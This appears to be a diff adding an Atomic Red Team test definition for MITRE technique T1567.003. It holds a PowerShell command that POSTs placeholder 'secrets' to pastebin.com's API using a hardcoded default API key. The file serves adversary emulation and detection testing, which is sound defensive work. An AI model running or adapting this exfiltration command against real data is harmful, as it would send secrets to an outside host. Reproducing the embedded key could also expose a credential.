@@ -1,0 +1,29 @@
+attack_technique: T1567.003
+display_name: 'Exfiltration Over Web Service: Exfiltration to Text Storage Sites'
+atomic_tests:
+- name: Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)                                  
+  auto_generated_guid: c2e8ab6e-431e-460a-a2aa-3bc6a32022e3
+  description: |
+    This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             
+    See https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                
+  supported_platforms:
+  - windows
+  input_arguments:
+    api_key:
+      description: Pastebin API key
+      type: string
+      default: 6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0
+  executor:
+    command: |
+      $apiKey = "#{api_key}"
+      $content = "secrets, api keys, passwords..."
+      $url = "https://pastebin.com/api/api_post.php"
+      $postData = @{
+        api_dev_key   = $apiKey
+        api_option    = "paste"
+        api_paste_code = $content
+      }
+      $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
+      Write-Host "Your paste URL: $response"
+    name: powershell
+    elevation_required: false
